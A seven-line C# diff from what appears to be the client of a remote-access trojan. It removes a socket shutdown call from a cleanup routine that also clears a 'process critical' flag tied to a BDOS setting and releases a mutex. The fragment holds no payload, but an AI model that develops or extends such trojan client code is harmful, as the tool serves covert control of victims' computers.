@@ -69,7 +69,6 @@ namespace Client.Helper
                 if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                     ProcessCritical.Exit();
                 CloseMutex();
-                ClientSocket.TcpClient?.Shutdown(SocketShutdown.Both);
                 ClientSocket.SslClient?.Close();
                 ClientSocket.TcpClient?.Close();
             }
